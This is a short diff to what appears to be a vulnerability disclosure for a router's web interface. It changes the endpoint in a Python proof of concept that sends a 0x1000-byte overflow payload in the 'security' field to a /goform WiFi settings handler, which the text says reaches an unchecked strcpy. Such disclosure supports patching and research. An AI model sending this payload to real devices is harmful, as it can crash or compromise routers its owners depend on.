@@ -25,7 +25,7 @@ then call strcpy, cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formWifiBasicSet"
+url = "http://192.168.1.13/goform/WifiBasicSet"
 payload = 'A'*0x1000 + '\n'
 
 r = requests.post(url, data={'security': payload})
